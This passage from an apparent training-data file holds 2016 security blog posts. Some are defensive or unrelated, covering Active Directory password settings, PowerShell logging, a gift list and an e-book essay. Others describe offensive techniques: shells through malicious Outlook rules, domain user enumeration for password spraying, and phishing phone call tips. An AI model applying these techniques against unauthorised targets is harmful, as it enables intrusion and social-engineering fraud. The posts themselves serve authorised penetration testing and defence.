Woot, Woot!\n\n____\n\n*Shout out to Joff Thyer and Derek Banks for the ideas and help in getting it going.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Increase the Minimum Character Password Length (15+) Policies in Active Directory\"\nTaxonomies: \"Author, Blue Team, Kent Ickler, Jordan Drysdale, long passwords, Password Security Objects, passwords, Windows 95/96, Windows Admin\"\nCreation Date: \"Mon, 28 Nov 2016 16:54:21 +0000\"\nKent Ickler // \n\nAs a start to a series on Windows Administration in the eyes of a security-conscious \u201cWindows Guy\u201d I invite you on configuring AD DS PSOs (Password Security Objects) and how they can be implemented in your environment to enforce acceptable password restrictions beyond what native AD GPO supports.\n\nThe Arbitrary: A drive for longer passwords.\n\nAbout the time you\u2019ve finished reviewing your SOX-DSS-HIPAA-Omnibus-PCI-CJIS-FBI-CIA-BYOBeer audit findings, your empathic auditor reveals the progressive requirement of a \u201c15 character minimum password.\u201d Possibly because last year\u2019s policy change and enforcement of a \u201c14 character minimum password\u201d was too much fun to not be an annual experience, you know a headache will soon ensue.   As the Active Directory Admin, you are about to learn the crux of backwards-compatibility and how it is limiting today\u2019s security platforms.\n\nBackwards Compatibility Limits Security\n\nHistory Lesson for the Post-Millennials\n\nBack in Windows 95/98 days, passwords were stored using the LM Hash.  The LM hash method was secure in its day-- a password would be same-cased, padded to 14 characters, broken into two 7 character halves, and each half is used to encrypt a static string.  The resulting two encryptions are put together, forming the LM Hash stored password.  Arguably LM Hash and cryptographic functions in yesteryear were sufficient mechanisms to store a password and data without the threat of a timely brute-force compromise.  Today, a lean built hashcat system will brute force 100 LM hashes in just a few moments.\n\nWhile Microsoft systems eventually retired the LM Hash for more secure (yet still compromisable) hash functions, the backwards compatible cryptography remained for years following NT4, leading systems into the new millennium with  password vulnerabilities and limiting acceptable Group-Policy configurations.  Native Active Directory group-policy password settings still haven\u2019t graduated from the 14 character stigma, this is most relevant when attempting to set a \u201c15 character minimum password\u201d.\n\nGroup Policy Limitation\n\nFear not, die-hard Windows 2012 GUI loving admins: Active Directory can natively support 15+ minimum character passwords, all from the GUI and without headaches!  Windows 2008 AD DS introduced \u201cFined Grained Password Policies\u201d or Password Setting Object (PSO).  PSOs instead of using a computer-object Group Policy targeted specific Active Directory user accounts or user groups.  However, creating a PSO in Windows 2008 was still reserved for ADSI editors and PowerShell ninjas (See more information at bottom).  In Windows 2012, the feature moved from the back-end Active Directory management and into a front-end GUI buried within the seldom used Active Directory Administration Center. More importantly though, in our hunt to overcome password character limitation requirements, PSOs allow for a maximum value of the minimum password character length 255 characters, effectively preventing password changes.\n\nPSOs in Windows 2012+\n\nSetting up PSO\u2019s within Windows 2012+ is easy and won\u2019t affect users until they attempt their next password change.\n\nBuyer beware and always test your work, however; see caveats at bottom.\n\nControl Panel -> System and Security -> Administrative Tools -> Advice Directory Administrative Center\n\nDomainName -> System -> Password Settings Container\n\nRight Click -> New -> Password Settings\n\nComplete the PSO settings and assign a User or User Group target.  To assign the policy to all users, use \u201cDomain Users\u201d.  Notice in this test we have specified 20 characters to be the minimum length for acceptable passwords.\n\nTesting your work:\n\nChanging password with a new 15 character password:\n\nTest your work:\n\nChanging password with a new 20 character password:\n\nCaveats and Considerations:\n\nThere are a couple of serious considerations that should be made when using a PSO to configure a password requirement.  On Administration and troubleshooting, PSO\u2019s don\u2019t lend themselves nicely in an RSOP, so be sure your administrators know to check for PSOs if your support desk is hearing about password-change headaches.  Know that because the PSO is targeting domain user accounts instead of domain computer accounts, workstation/server local user accounts will not be affected, nor will domain computer accounts be affected.  It is important therefore to operate both the typical Active Directory Group Policy as well as the PSO to limit acceptable passwords.\n\nThere are other alternatives to using a PSO to set the password policy to limit acceptable passwords.  There are HKLM reg-hacks that will force submissive systems to specific password lengths.  There is also a decade\u2019s old solution of building a custom password filter library and registering it in the system.  Regarding backwards compatibility & LM Hashing, there are solutions within Group Policy and HKLM for that too.\n\nAs Microsoft slowly closes the backward-compatibility security gap, we may eventually find that the Password Policies within native AD DS Group Policies will begin to catch up to the security standards of today and forcing a 7, 14, 15 255, 500 character minimum password that will be no headache at all-- Or, we\u2019ll all just be chiseling stone tablets.\n\nOn a last note, be sure to buy your internal auditors and pen-testers breakfast.\n\nMore Information:\n\nCreating a PSO in Windows 2008: https://technet.microsoft.com/en-us/library/cc754461(v=ws.10).aspx\n\nLM Hash information: https://technet.microsoft.com/en-us/library/hh994558(v=ws.10).aspx\n\nPreventing the use of LanMan Hash: https://support.microsoft.com/en-us/kb/299656\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Malicious Outlook Rules in Action\"\nTaxonomies: \"External/Internal, How-To, Red Team, Outlook\"\nCreation Date: \"Tue, 29 Nov 2016 15:01:04 +0000\"\n Carrie Roberts //\n\nGetting a shell using a malicious Outlook rule is an awesome tool during a pentest and great fun! Nick Landers had a great post including enough information to make this happen. Although it left a few things for the reader to figure out and there was one gotcha. In this post I provide some additional information to help you get this going.\n\nFirst, the Gotcha . . .\nYou need to use Python3 to run the rulz.py script. Otherwise you get an error similar to that shown below.\n\nRulz.py Error When Run with Python 2.x\nSecond, details for setting up a WebDAV server . . .\nThe original SilentBreak Security blog post gave minimal details for setting up your WebDAV server so I provided detailed instructions here. I suggest using a read-only WebDAV server so your payloads don\u2019t get maliciously overwritten. When you run rulz.py, give it a local filename to save the rule to instead of the location on your WebDAV server. I also provide expanded information on setting up your Empire listener here to improve your chances of success.\nThird, be sure to close your local instance of Outlook before sending an email to the target so that the payload executes on their machine and not yours.\nFourth, Shellz!\nAdditional References:\n\nGetting Outlook Credentials:\n\nhttp://www.blackhillsinfosec.com/?p=4694\nhttp://www.blackhillsinfosec.com/?p=5330\nMore on Malicious Rules:\nhttps://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/\n\n______\nFor tips on getting a shell through a malicious outlook rule without using an EXE file, see this related post.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Domain Password Audit Tool\"\nTaxonomies: \"Blue Team, Blue Team Tools, Red Team, Red Team Tools, Domain Password Audit Tool, DPAT\"\nCreation Date: \"Thu, 01 Dec 2016 17:50:51 +0000\"\nCarrie Roberts //\n\nA tool to generate password usage statics in a Windows domain based on hashes dumped from a domain controller. The Domain Password Audit Tool (DPAT) is a python script that analyzes the hash information in combination with a list of cracked passwords output from a tool such as oclHashcat. The script generates an interactive HTML report containing complete details to help you understand password use in an environment and identify issues. An option to generate a sanitized version of the report is also included.\n\nExample Summary Page of DPAT Report\nComplete usage instructions and code are available on GitHub here: https://github.com/clr2of8/DPAT\n\n_____\nWant to see a demo of this in action? Check out Carrie's webcast demo here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Domain User Enumeration\"\nTaxonomies: \"Red Team, Red Team Tools, password spraying, powershell domain user enumeration, tools\"\nCreation Date: \"Wed, 07 Dec 2016 14:54:13 +0000\"\nChevy Swanson //\n\nEveryone loves being able to speed up their work with custom tools, but the clear problem is that computers are a bit too fussy about everything being perfect and exact. One very specific place where this problem comes up is when working with users on a domain. No matter how you try to get a list of users, it\u2019s going to be packaged with all sorts of small things like inconsistent spacing and visual details that offer no real value. This isn\u2019t a real problem because we are just fine distinguishing between the fluff and the real data we need. While I am sure that there is a startup somewhere that is probably boasting how easy it is to get their \u201cAI\u201d to do the same, I doubt that you want to create Skynet every time you need to parse the output of a command.\nThe best example of where a username list is useful is in this simple password spraying attack. All it needs is a small list of common passwords, and a list of domain users. This stops being so simple when you have a lot more users than you want to make a list for. Simply put, when faced with hundreds or thousands of users in a domain, it's not usually the best idea to manually add them to a list so you can run this attack. With two commands (one if you want to just combine them into one nice script), you can sit back and let people\u2019s bad judgement in passwords do your work for you. Relaxing!\nA few commands and one liners for generating the username list that seemed to work at first would break or become useless at higher numbers of users on the domain. To address these problems, I wrote up a short script that simply takes the output of \u201cnet users /domain\u201d and puts the usernames into a text file, one name per line. We have had a lot of success using this script in situations where we have had to parse thousands of names and it holds up fine and gets through it fast. Feel free to use it to save you a few minutes sometime in the future: https://github.com/duckingtoniii/Powershell-Domain-User-Enumeration\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"BHIS's Annual Infosecker's* Gift-List\"\nTaxonomies: \"Fun & Games, christmas, gifts, holidays, infosecker, presents\"\nCreation Date: \"Fri, 09 Dec 2016 16:06:36 +0000\"\n\nSierra Ward & Staff //\n\nBuying gifts can be tough, especially for your family members who are totally mystified by your profession. \u201cDon\u2019t you hack the stuff with the things?\u201d Have no fear, BHIS is here (you can forward this on to them for a reference)!  I\u2019ve asked around and this list is infosecker approved.  I hope our testers didn\u2019t think I was asking because I was going to buy them things\u2026  \n\nMr. Robot (Seasons 1 & 2) - Ahhhh\u2026. binge watching, isn\u2019t that what short winter days are for?  And if not short winter days, then definitely holiday vacations and breaks! For when you just can\u2019t get enough of the gritty depressing world of infosec at work!\n\nSeason 1 available on Amazon Prime (Season 2 on DVD/Blue Ray). Or the iTunes store. (Protip: you can\u2019t tell the difference between HD and SD on an iPhone, so save some money and space.)\n\nThe Cuckoo\u2019s Egg - reads like fiction, but isn\u2019t. Back from the ancient world of 1986, this is for when you can\u2019t get enough of infosec at work, but prefer reading!\n\nIf you feel like you\u2019re fighting the same battles over and over again at work, go back to them and see how different things were. They had dial-up modems. Otherwise \u2026 pretty much the same.\n\nDeath Wish Coffee\n\nFrom their website: \u201cDeath wish coffee is created by using the strongest combination of beans and a perfect roasting process.\u201d Sounds delish! This is Beau\u2019s favorite, though we have yet to try any in the office.  We\u2019ve added it to our office wish list as well! (hint, hint!)\n\n\u201cI don\u2019t drink coffee, but I hear it helps you not sleep\u201d -Kelsey\n\n\u201cDeath wish coffee? That sounds interesting\u201d -Brian F\n\n\u201cWait, what Kelsey? How can you not drink coffee?\u201d BB King\n\nCardboard VR Glasses \n\nBecause let\u2019s face it VR isn\u2019t QUITE there yet, so in the meantime, a box on your face should do the trick. Also, cheap!\n\nBlisstime Google Cardboard V2.0 3d Glasses Vr Virtual Reality Cardboard Kit with Headband Fit for 3--6inch Screen\n\nBooks are like the necktie of gifts - some people think it\u2019s boring, others love them! You\u2019ll know how to proceed.\n\nRTFM: Red Team Field Manual by Ben Clark - Because it\u2019s a classic reference and also, this name - brilliant.\n\nDescription from Amazon: \n\n\u201cThe Red Team Field Manual (RTFM) is a no fluff, but thorough reference guide for serious Red Team members who routinely find themselves on a mission without Google or the time to scan through a man page. The RTFM contains the basic syntax for commonly used Linux and Windows command line tools, but it also encapsulates unique use cases for powerful tools such as Python and Windows PowerShell. The RTFM will repeatedly save you time looking up the hard to remember Windows nuances such as Windows wmic and dsquery command line tools, key registry values, scheduled tasks syntax, startup locations and Windows scripting. More importantly, it should teach you some new red team techniques.\u201d\n\n\u201cI avoid Windows as actively as possible, and this book helps me do that. Now I don\u2019t have to learn Windows, I can just reference it.\u201d -Some BHIS Tester at some point\n\nThe Web Application Hacker's Handbook\n\nThere isn\u2019t a description on Amazon but check out this review by Jason Haddix (from 2011):\n\n\u201cThere's a running joke we have on our assessment team about the Web Application Hackers Handbook. Every time we see a new technology, or have to deal with a one-off situation, we start doing research online only to find it was already referenced in WAHH somewhere. We've all read this book several times too, it's like Dafydd and Marcus sneak into our houses at night and add content...\n\nJoking aside though, there is no other reference for web hacking as thorough or complete as WAHH.\n\nWith WAHH2 the authors added a significant amount content and rehashed existing chapters that were already deeply technical. The bonus in WAHH2 is its associated labs. Dafydd and Marcus have been giving a live WAHH training for years and have now moved the stellar CTF like challenges to the cloud. You can buy credits ($7 for 1hr) and move right along as you read the book (MDSec.net). When I say the labs are stellar, I mean it. The labs come almost straight from the class and start trivial and then get crazy. The injection labs were by far my favorite, housing 30-40 different injection types/variants each between XSS/SQLi. The CTF in the class (which i'll mention again is where the MDSec.com labs are based from) gets ridiculous toward the end. Even seasoned web testers fall around questions 14-16. But i digress...\n\nWAHH2 is now the defacto buy for any pentest/QA/Audit team. Its usage will surpass any other book on your bookshelf if you are doing practical testing.\n\n5 stars, i'd give it 10 if I could.\u201d\n\nHacking Exposed Wireless\n\n\u201cThe first six chapters cover everything you need to do a wireless assessment. Really.\u201d - Fletch\n\nThe Tangled Web: A Guide to Securing Modern Web Applications 1st Edition by Michal Zalewski\n\n\u201cOoh - great book! It's aging almost as well as The Cuckoo's Egg, I think.\u201d - BB King\n\nDescription from Amazon:\n\nModern web applications are built on a tangle of technologies that have been developed over time and then haphazardly pieced together. Every piece of the web application stack, from HTTP requests to browser-side scripts, comes with important yet subtle security consequences. To keep users safe, it is essential for developers to confidently navigate this landscape.\n\nIn The Tangled Web, Michal Zalewski, one of the world's top browser security experts, offers a compelling narrative that explains exactly how browsers work and why they're fundamentally insecure. Rather than dispense simplistic advice on vulnerabilities, Zalewski examines the entire browser security model, revealing weak points and providing crucial information for shoring up web application security. You'll learn how to:\n\nPerform common but surprisingly complex tasks such as URL parsing and HTML sanitization\n\nUse modern security features like Strict Transport Security, Content Security Policy, and Cross-Origin Resource Sharing\n\nLeverage many variants of the same-origin policy to safely compartmentalize complex web applications and protect user credentials in case of XSS bugs\n\nBuild mashups and embed gadgets without getting stung by the tricky frame navigation policy\n\nEmbed or host user-supplied content without running into the trap of content sniffing\n\nFor quick reference, \"Security Engineering Cheat Sheets\" at the end of each chapter offer ready solutions to problems you're most likely to encounter. With coverage extending as far as planned HTML5 features, The Tangled Web will help you create secure web applications that stand the test of time.\n\n\u201c..or at least realize you\u2019re not alone when they don\u2019t\u201d BB King\n\nRaspberry Pi 3 & Zero\n\nSpend Christmas break building some of this years BHIS projects! (Beau\u2019s post &  Jordan\u2019s post)\n\n\"OMG! It's so tiny and adorable, I\u2019ll take 10\u201d -All people, everywhere\n\n\u201cCan we please get a hundred of these and build a supercomputer??\u201d -Lawrence (paraphrased)\n\nAdafruit Feather boards\n\nIf the Raspberry Pi is too straightforward, try one of these! There are a bajillion options, so pick one and challenge your hacker to find a creative use. WiFi? Bluetooth? Packet radio? Data logger? Tell us what they build!\n\nUSB data blocker (stocking stuffers!)\n\nYou rent a car and it has a handy-dandy USB charging port.  But do you really need that rental car to have access to all of your phone\u2019s data?  NO!  Use this so that all that comes through that USB port is power and not data transferring!\n\n\u201cCan\u2019t we just bring our own wall adapters?\u201d BB King\n\nNo BB King, no you can't! There are ONLY usb sockets! Gaaahhhh!\n\nRFID blocking wallet\n\nTurns out you\u2019re not as crazy as people once thought to be wary of people stealing your credit card info.  Block all those pesky RFID thieves with this wallet!\n\nThe Badgy\n\nIf you\u2019re feeling spendy, and want to really pull out all the stops you might think about a Badgy!  Who wouldn\u2019t love a reason to print any kind of fake badge for physical pen tests?\n\n\u201cWant!\u201d -Kelsey (more or less)\n\nGeeky T-Shirts\n\nThere\u2019s no place like 127.0.0.1 for the holidays either!\n\nHacking Fuel\n\nYummy and how else are you going to become that 400lb hacker?!\n\n\u201cThey\u2019re basically air, they don\u2019t add any weight, promise\u201d -Kelsey, who doesn\u2019t eat Cheetos\n\n\u201cGood thing my keyboard keys are black, otherwise they\u2019d be orange\u201d -Gail, who also doesn\u2019t eat Cheetos\n\nPizza Bag\n\nI picked this specifically for Kelsey, who loves food, and also cutesy things. But really, who on your list wouldn\u2019t LOVE a pizza purse.\n\n\u201chahaha, It\u2019s so happy, why is a sparkly pizza bag almost $50??\u201d -Kelsey, in a hangouts message\n\nDivided Keyboard\n\nFor those scary moments when you\u2019re getting hacked and need assistance from a friend! (This might be one of our favorite \"hacking\" scenes from a TV show.)\n\n[embed]https://www.youtube.com/watch?v=u8qgehH3kEQ[/embed]\n\n\u201cErgonomics fixes your back, my wrists don\u2019t hurt anymore, so much money, blah blah worth it.\u201d -Lawrence (paraphrased)\n\n\u201cThat\u2019s exactly how Lawrence talks.\u201d - Sierra\n\nTreadmill Desk\n\nWe keep hearing that sitting is as bad as smoking and it terrifies us as we have sitting jobs.  Last year we got on an office running kick, and this year we\u2019re doing, even more, to combat early death from sitting.  Gail bought a treadmill desk and Kent built us all standing desks in the office (painful!).  Maybe your lucky infosec-er would like to walk!  Even a super slow walk over the course of a few hours burns beaucoup calories!\n\n\u201cI never understood why people couldn\u2019t shut up about their treadmill desks, I mean, gawd, so annoying, right? But now I can\u2019t shut up about mine. I love it soooo hard!\u201d -Gail (paraphrased)\n\nBurner Phone\n\nDid someone say a burner phone?\n\n\u201cIf you go to Walmart, you\u2019re gonna have to break up your order into several parts, but it turns out the Walmart cashiers don\u2019t care.\u201d -Rick or Jordan, on the fact that Walmart only lets you buy a certain number of burner phones at one time.\n\nOther Ideas\n\n\"Anything from the Hak5 shop is cool:\n\n\u201cI already have a Pineapple though.\u201d -BHIS Tester\n\n\u201cYou could always have two Pineapples.\u201d -Another BHIS Tester\n\nAnd when all else fails, some bitcoin is always great! Then your InfoSecker can buy their own toys, anonymously!\n\n\u201cI thought bitcoin was dead?\u201d -Kelsey\n\n\u201cDidn\u2019t everyone switch over to dogecoin? ;) \u201d -Someone who wasn\u2019t Kelsey, promise\n\n\u201cDogecoin is clearly not as important because I\u2019VE never heard of it.\u201d -Sierra (office temperature of \u201cvery average person\u201d)\n\nConclusion\n\nI hope you found some things for the infosecker in your life!! We\u2019re wishing you all the merriest and most wonderful of holidays!! ______   *Why yes, we did name this the InfoSecker's list, because it's not just pentesters, it's not just defenders, but it's someone more specific than just regular IT person. You saw it here first! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PowerShell Logging for the Blue Team\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Joff Thyer, Blue Team, Joff Thyer, PowerShell\"\nCreation Date: \"Mon, 12 Dec 2016 16:51:50 +0000\"\nJoff Thyer //   \n\nIt is no secret that PowerShell is increasingly being used as an offensive tool for attack purposes by both Red Teamers and Criminals alike. Thanks to the efforts of a number of people in the industry, we have tools like PowerSploit, PowerShell Empire, MailSniper, and Bloodhound just to name a few of the top contenders. While most of these tools are definitely post-exploitation in nature, the ability of Red Teamers, and attackers to trivially social engineer end users provides an easy path to extensive PowerShell usage.\n\nWindows 7 is still prevalent in enterprise environments with the default installation version of PowerShell at 2.0. Unfortunately, this version of PowerShell provides no real event logging ability, thus leaving defenders largely blind with the exception of one PowerShell script signing policy.\n\nFortunately for defenders, Microsoft has responded with significant PowerShell logging enhancements in the Windows Management Framework (WMF) starting with version 4.0, and version 5.0. If an organization is using Windows 10, then the Windows Management Framework is already installed at version 5.0. For those organizations still at Windows 7, it is advisable to upgrade all workstations to WMF version 5.0 bring PowerShell also up to version 5. In addition, Windows 7 has a dependency on dot NET version 4.5 in order to install WMF 5.0. Once this is completed, there are some additional event logging features enabled which include the following:\n\nModule Logging: logs PowerShell pipeline execution details during execution including variable initialization, and command invocation. Module logging is able to record some de-obfuscated scripts, and also some output data. This form of logging has actually been available since PowerShell 3.0 and will log all events to Event ID 4103.\n\nScript Block Logging: logs and records all blocks of PowerShell code as they are executing. The full contents of the code, including the entire script, and all commands are captured. Script block logging also captures all de-obfuscated code due to the object-oriented nature of its implemented. For example, if a script is base64 encoded using the \u201c-Encoded\u201d command argument, script block logging will log the actual decoded script block during execution. Unlike module logging, script block logging does not log the output from executed scripts. If an event exceeds the maximum event log message size, script block logging will split the logged events into multiple events. Additionally, in PowerShell 5.0, script block logging will log events that match a list of suspicious commands at a logging level of \u201cwarning\u201d. The normal logging level will be \u201cverbose\u201d or \u201cinformational\u201d when enabled. The \u201csuspicious\u201d events will be logged regardless unless script block logging is explicitly disabled. All script block logging events are logged as event ID 4104. In addition to this event, there is an option to log script block execution start and stop events as event ID 4105, and 4106. In my experimentation, enabling this option also provides little additional benefit at the cost of many more events being logged, thus I chose to leave this option disabled.\n\nFull Transcription Logging: logs a full transcript of every single PowerShell session with input and output data. The transcripts are written to individual files with a naming convention that prevents name collisions. It is important to note that transcription only records what appears in the PowerShell terminal windows which does include the contents of scripts or output written directly to the file system. While the transcripts are written by default to the documents folder, this is configurable. It would be advisable to write the transcripts to something like a network share to avoid being deleted and/or modified by an attacker.\n\nAfter performing the required upgrade to WMF 5, and PowerShell 5 (if using Windows 7), the next step is to enable the logging options. All of these options can be enabled through group policy, however, be aware that the appropriate Windows 10 administrative template files need to be installed before the group policy options will be visible. Not being a former Windows system administrator, I struggled through this for a while before I found the administrative template download located at this Microsoft web page.\n\nhttps://www.microsoft.com/en-us/download/details.aspx?id=48257\n\nNote that after installation of the administrative templates, your task is not over. All that the installation actually does is copy the files into the \u201c\\Program Files (x86)\\Microsoft Group Policy\u201d directory. It is up to you to move the appropriate \u201cPowerShellExecutionPolicy.admx\u201d, and the \u201cPowerShellExecutionPolicy.adml\u201d into the correct locations on your system. In a domain environment, the SYSVOL can also be used to deploy administrative templates by using the \u201c\\\\SYSVOL\\Policies\\Policy Definitions\u201d directory.\n\nAfter doing this, your local or domain group policy should contain the additional logging options both in the computer, and user configuration areas. The path to the configuration under each area is:\n\nPolicies -> Administrative Templates -> Windows PowerShell\n\n Group Policy Editor Screenshot \n\nOnce you have defined these group policy options, the actual events will be logged on the local system in the Applications and Services Logs, as follows:\n\nApplications and Services ->\n\n                Microsoft ->\n\n                        Windows ->\n\n                                PowerShell ->\n\n                                        Operational\n\nThe following screenshot was taken after establishing a PowerShell empire session on a remote system. In the process, many different script block log entries were created showing important detailed information on all of the different script blocks being executed. You can also see in this event log that a couple of entries are logged at a \u201cWarning\u201d level indicating potentially suspicious code being executed.\n\nHaving said all this, do yourselves a favor, and get WMF 5.0 installed in your environment followed by enabling script block logging at minimum. Friends don\u2019t let friends run PowerShell without logging! Of course, I am assuming that you are all happily planning on collecting these event logs centrally right!?\n\nHappy hunting!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bite the Pages of an Ebook: Tiny People Need to See You Get Excited about Electronic Text\"\nTaxonomies: \"InfoSec 101, ebooks, electronic text, Millineals, reading online, reading with children, reading with kids, tiny people\"\nCreation Date: \"Wed, 14 Dec 2016 17:48:57 +0000\"\n Gail Menius //\n\nWe avoid tasks that are too hard. When we avoid them (consciously or unconsciously) the things we do instead are called \u201cavoidance behaviors.\u201d Adults and teachers alike demonstrate avoidance behavior when it comes to digital print.\nOne of the main ways that parents can ensure their children learn to read is to demonstrate an interest in reading. This is done by reading around them. You can read anything, it doesn\u2019t matter. Children imitate activities we enjoy and show them we enjoy. If we model avoidance behaviors when it comes to reading electronic texts, the children in our lives will be, in my opinion, less likely to be able to read things like websites, articles, and online dictionaries. In a world where digital print is not just an option, but in many cases the standard, avoidance behavior when it comes to digital print cannot be tolerated.\nIf you are worried about the children in your life not having the life skills necessary to navigate to safe, quality websites, you are correct. If you fear that children don\u2019t really understand what they are reading on the screen, your fears are validated. But there are resources to help children of all ages to navigate safely and understand what they read. Common Sense Media is a great resource. But in this blog post, I will specifically address how our negative attitude towards digital print transfers to our children and explain why we should not avoid reading and teaching children to read digital print.\nDigital print is all around us. We read Twitter for professional development, Reddit for entertainment, use Flipboard and news websites (CNN, FOX news, Washington Post) to educate ourselves as a member of our wider community. It\u2019s not just news sites that we don\u2019t understand. The other day my husband misunderstood a text because he was using skills that he learned from reading printed text in order to understand what our friend was trying to tell us about a birthday brunch. Here is a short story about this misunderstanding.\nA Personal Story about Digital Misunderstanding\nOn December 9th, my husband and I got a text from our friend, Jamie. It read something like this:\n\nTony\u2019s birthday is on Sunday. We will all be working on Sunday, so we thought we\u2019d do lunch on Saturday at 11:15. Will you be joining us? I need to make a reservation.\n\nFriday night as I was going to bed, I assumed that my husband set the alarm for us to get to brunch on time because he responded to the group text that we would like them to add us to the reservation. I woke up at 11:30. I looked at my husband and said, \u201cWhat day was that brunch?\u201d\n\u201cSunday,\u201d he said.\nI smiled to myself, realizing that electronic text includes not only pdf\u2019s or ebooks, it also includes texts you send on your phone. I said to my husband, realizing that a whirlwind of showers and panic-getting ready was in store for us. \u201cI think you should check again.\u201d\n\u201cMost of us simply don\u2019t have the comprehension skills necessary to accumulate evidence, synthesize our experiences, and propose a position supported by text we find online. \u201c\nMillennials Are not Immune to Misunderstanding Digital Print\nGeneration X, Baby Boomers, all of us \u201colder folk\u201d are all at a disadvantage for reading electronic text. Most of us simply don\u2019t have the comprehension skills necessary to accumulate evidence, synthesize our experiences, and propose a position supported by text we find online. In school we were taught to read books and articles printed on a page. We were not taught to read online.\n \nThis lack of exposure to electronic texts can be seen even in my world as a project manager for BHIS. I have seen information security professionals accidentally click on an advertisement. I have also seen them only answer one of three questions proposed on an email. It\u2019s not a criticism, it\u2019s just that we haven\u2019t been equipped with the strategies and skills necessary to be effective and safe online. This lack of skill does not just pertain to Generation X and older. Millennials also have difficulty with electronic text.\nStudying for my undergraduate degree also showed me evidence that Millennials didn\u2019t know how to process electronic texts. The printer at my college was consistently hot, printing article after article which students needed in order to write their papers. It would cost them 5 cents a page, and some of these poor students were printing out articles that were a hundred pages of text or more.\n\u201cWhy would frugal college students be printing out articles? It\u2019s because they understand an article better if it\u2019s printed.\u201d\nAs an elementary literacy teacher and coach in the Rapid City Area School District, I noticed that teachers were also hesitant to give students electronic text. The majority of their reading is done either on paper or in books held in their hands, turning the pages one by one. The argument that I heard over and over again is that students just don\u2019t understand what they\u2019re reading if it\u2019s on a screen.\nPlaying with Books is Learning Concepts of Print\nHave you ever seen a toddler with a board book? Toddlers don\u2019t read the pages, they flip through them, bite one them, they explore the format of the text, the \u201cconcepts of print,\u201d before they\u2019re ever ready to read. I argue that electronic texts have a format as well, many formats in fact.\nIf we never give children electronic texts, the same is true, they\u2019ll flip through the pages, glance at pictures, much like a toddler does with a board book.\nWe have electronic books, articles downloaded as PDFs, web pages, and these are just three of the many types of electronic texts we are exposed to. If we never give children a magazine, they\u2019ll never know how to read one. If we never give children electronic texts, the same is true, they\u2019ll flip through the pages, glance at pictures, much like a toddler does with a board book. Just because we don\u2019t feel at ease reading an ebook or article doesn\u2019t mean our children can\u2019t learn.\nDigital Print is the Standard\nPeople of all ages have the ability to learn to digest information in electronic format. But you never stop learning how to read better, no matter what the format. Electronic format is an increasingly important way to read, and your skill influences your attitude to what your children will read. If your attitude towards reading a PDF or an ebook is that you would prefer a print book, that, my friends, means that you have more comprehension skills and strategies for a print book than electronic text. And electronic text is not the future of information, it is the standard.\nFind Easy Books to Enjoy with your children\nPeople find their lives and experiences more rich if the challenge they are presented matches their skill. If you or your children do not enjoy electronic text, the answer is that your family needs to increase your skill. The simplest way to help your children increase their skill is to find their \u201czone of proximal development.\u201d The Zone of Proximal Development is a fancy way of saying, \u201cFind a skill that is a little bit too hard for the child and teach them.\u201d Find a single skill to teach (like turning pages) and show them how to do it. Then do it with them, Then they can do it on their own. The trick is to find that skill. My advice, watch them try to read an easy book on a kindle. Praise them for what they do well, and find one thing to help them with. Just teach them that one skill for a week or more.\nOne student said, \u201cI would have liked an easier book so that I could learn how to use the Kindle better.\u201d\nWhen teaching children how to read electronic books, find an easy book. The challenge shouldn\u2019t be the words, you want the challenge to be navigating the text. Find a book that is easy for them to read so they may concentrate on learning how to understand the format. When I asked my 5th grade students what would have made reading on an ebook a more pleasant experience, I got valuable advice. One student said, \u201cI would have liked an easier book so that I could learn how to use the Kindle better.\u201d What she was trying to say was that her cognitive demand was too high because she was working on her reading skill while she was presented with a challenging book.\nIf you have nostalgia for old books, please, continue to read and enjoy them, but for your child\u2019s sake, let them \u201cbite the pages of their electronic board book.\u201d Read easy articles to them that you find online from National Geographic for Kids. Borrow electronic books from your local library and have lap time with your little ones. Show your 4th graders how to avoid clicking on ads. And above all, keep a positive attitude about reading electronic texts. Children know how you feel about reading articles and books you find online.\n\"The best moments in our lives are not the passive, receptive, relaxing times\u2026 The best moments usually occur if a person\u2019s body or mind is stretched to its limits in a voluntary effort to accomplish something difficult and worthwhile.\" ~ Mihaly Csikszentmihalyi (1990, p. 3)\nWorks Cited:\nhttp://www.pursuit-of-happiness.org/history-of-happiness/mihaly-csikszentmihalyi/\nhttp://researchguides.weebly.com/e-books-audiobooks-and-video-from-overdrive.html\nhttp://kids.nationalgeographic.com/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Marketers Lessons in Con Artistry for Good & Learning\"\nTaxonomies: \"Phishing, Red Team, con artistry, Marketing, pen-testing, penetration testing, Pentesting, phishing, social engineering\"\nCreation Date: \"Fri, 16 Dec 2016 19:21:51 +0000\"\nSierra Ward* //\n\nNormally I am hidden in the back rooms at BHIS, chipping away at 10 million marketing tasks.  I show up occasionally in webcasts, lurking again in the shadows, answering your questions and talking with people on the chat. My most public appearances aren\u2019t even \u201cme\u201d as I hammer away on social media, but behind the shield of BHIS (pun intended).  This puts me often times in an interesting position because while I represent a pen testing company on social media I don\u2019t in fact  \u201c... security, bro?\u201d (The classic pentesting marketers quandary as referenced by Jason Blanchard in his DerbyCon talk.) Except\u2026.. I do\u2026..kinda.\nLately I\u2019ve found a niche market for marketing skills in the world of pentesting.  As one of the testers said, at its heart, marketing is persuasion.  As a marketer your job is to persuade people to trust the company, to build relationships, and to generate good feelings (which, yes, can sometimes seem sleazy, manipulative and full of marketing mumbo jumbo nonsense.  John and I both share an abhorrence for that kind of marketing and I try very sincerely to never make marketing at BHIS any of those things).  But persuasion feeds brilliantly into social engineering, where your main job is to persuade people to do what you want/need.  You come up with a ruse, figure out how to be convincing and go after your assigned marks (the client always okays all ruses, and knows all aspects of the plan before we start).  While it feels very much like con artistry,  it\u2019s not con artistry, because we\u2019re not really bad guys, who are after your sensitive data, just pretending to be bad, for practice - your practice.  \nAfter helping on several of the phishing portion of tests we\u2019ve done this year, here are tips both doing phishing calls, and on the flip side - spotting phishing calls.  \nGeneral Tips: \n*Remember, people have been taught very carefully to avoid suspicious emails.  But not as much time has been taken to teach them to recognize suspicious phone calls.  Your best bet is calling.  \n*People very rarely care what area code 